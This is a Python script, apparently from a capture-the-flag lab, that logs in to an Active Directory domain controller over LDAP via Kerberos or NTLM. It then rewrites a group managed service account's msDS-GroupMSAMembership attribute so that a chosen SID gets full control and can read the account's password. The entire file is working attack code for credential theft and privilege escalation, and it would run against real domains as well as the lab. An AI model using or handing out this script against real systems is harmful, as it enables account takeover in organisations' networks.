#!/usr/bin/env python3
import ldap3
from impacket.ldap import ldaptypes
import os
import argparse
import sys

def parse_arguments():
    parser = argparse.ArgumentParser(description='Grant gMSA read access via LDAP')
    parser.add_argument('-t', '--target', required=True, help='Target IP address')
    parser.add_argument('-d', '--domain', required=True, help='Domain name (e.g., logging.htb)')
    parser.add_argument('-u', '--username', required=True, help='Username (e.g., svc_recovery)')
    parser.add_argument('-p', '--password', required=True, help='Password')
    parser.add_argument('-s', '--sid', required=True, help='Target SID to grant access')
    parser.add_argument('--gmsa-cn', default='msa_health', help='gMSA Common Name (default: msa_health)')
    parser.add_argument('--dc-ip', help='Domain Controller IP (if different from target)')
    parser.add_argument('--ccache-file', default='svc_recovery.ccache', help='CCACHE filename (default: svc_recovery.ccache)')
    parser.add_argument('--faketime', default='+7h', help='Faketime value (default: +7h)')
    parser.add_argument('--no-kerberos', action='store_true', help='Use NTLM instead of Kerberos')
    return parser.parse_args()

def get_kerberos_ticket(target_ip, domain, username, password, ccache_file, faketime):
    """Get Kerberos ticket using getTGT"""
    print(f"[*] Obtaining Kerberos ticket for {username}@{domain}")
    cmd = f"faketime -f '{faketime}' impacket-getTGT '{domain}/{username}:{password}' -dc-ip {target_ip}"
    print(f"[*] Run this command in another terminal:")
    print(f"    {cmd}")
    print(f"[*] Then set: export KRB5CCNAME=$(pwd)/{ccache_file}")
    input("[*] Press Enter after obtaining ticket and setting KRB5CCNAME...")

def ldap_kerberos_auth(target_ip, domain, username):
    """Authenticate via Kerberos"""
    server = ldap3.Server(target_ip, get_info=ldap3.ALL)
    user_principal = f"{username}@{domain.upper()}"
    
    conn = ldap3.Connection(
        server,
        user=user_principal,
        authentication=ldap3.SASL,
        sasl_mechanism=ldap3.KERBEROS,
        auto_bind=True
    )
    return conn

def ldap_ntlm_auth(target_ip, domain, username, password):
    """Authenticate via NTLM"""
    server = ldap3.Server(target_ip, get_info=ldap3.ALL)
    user_dn = f"{domain}\\{username}"
    
    conn = ldap3.Connection(
        server,
        user=user_dn,
        password=password,
        authentication=ldap3.NTLM,
        auto_bind=True
    )
    return conn

def build_security_descriptor(target_sid):
    """Build security descriptor with full control ACE for target SID"""
    sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
    sd['Revision'] = b'\x01'
    sd['Sbz1'] = b'\x00'
    sd['Control'] = 32772  # SE_DACL_PRESENT | SE_SELF_RELATIVE
    sd['OwnerSid'] = ldaptypes.LDAP_SID()
    sd['OwnerSid'].fromCanonical('S-1-5-18')  # Local System
    sd['GroupSid'] = b''
    sd['Sacl'] = b''
    
    # Create ACL
    acl = ldaptypes.ACL()
    acl['AclRevision'] = 4
    acl['Sbz1'] = 0
    acl['Sbz2'] = 0
    
    # Create ACCESS_ALLOWED_ACE
    ace = ldaptypes.ACE()
    ace['AceType'] = 0  # ACCESS_ALLOWED_ACE_TYPE
    ace['AceFlags'] = 0
    
    nace = ldaptypes.ACCESS_ALLOWED_ACE()
    nace['Mask'] = ldaptypes.ACCESS_MASK()
    nace['Mask']['Mask'] = 983551  # Full control (GENERIC_ALL)
    nace['Sid'] = ldaptypes.LDAP_SID()
    nace['Sid'].fromCanonical(target_sid)
    ace['Ace'] = nace
    
    acl.aces = [ace]
    sd['Dacl'] = acl
    
    return sd.getData()

def modify_gmsa_permissions(conn, gmsa_cn, domain, security_descriptor_data):
    """Modify gMSA object's msDS-GroupMSAMembership attribute"""
    # Construct DN
    gmsa_dn = f'CN={gmsa_cn},CN=Managed Service Accounts,DC={domain.replace(".", ",DC=")}'
    
    print(f"[*] Target DN: {gmsa_dn}")
    print(f"[*] Modifying msDS-GroupMSAMembership...")
    
    conn.modify(
        gmsa_dn,
        {'msDS-GroupMSAMembership': [(ldap3.MODIFY_REPLACE, [security_descriptor_data])]}
    )
    
    return conn.result

def main():
    args = parse_arguments()
    
    print(f"[+] Target: {args.target}")
    print(f"[+] Domain: {args.domain}")
    print(f"[+] User: {args.username}")
    print(f"[+] Target SID: {args.sid}")
    print(f"[+] gMSA: {args.gmsa_cn}")
    
    # Use DC IP if provided, otherwise use target
    dc_ip = args.dc_ip if args.dc_ip else args.target
    
    if not args.no_kerberos:
        # Kerberos authentication
        get_kerberos_ticket(dc_ip, args.domain, args.username, args.password, 
                           args.ccache_file, args.faketime)
        
        # Check for ccache file
        if 'KRB5CCNAME' not in os.environ:
            print("[!] KRB5CCNAME environment variable not set!")
            print(f"[!] Run: export KRB5CCNAME=$(pwd)/{args.ccache_file}")
            sys.exit(1)
        
        conn = ldap_kerberos_auth(args.target, args.domain, args.username)
    else:
        # NTLM authentication
        conn = ldap_ntlm_auth(args.target, args.domain, args.username, args.password)
    
    print(f"[+] Connected as: {conn.extend.standard.who_am_i()}")
    
    # Build and apply security descriptor
    sd_data = build_security_descriptor(args.sid)
    result = modify_gmsa_permissions(conn, args.gmsa_cn, args.domain, sd_data)
    
    if result['result'] == 0:
        print(f"[+] Successfully granted {args.sid} read access to {args.gmsa_cn}$ password")
    else:
        print(f"[-] Modification failed: {result}")
    
    conn.unbind()

if __name__ == "__main__":
    main()
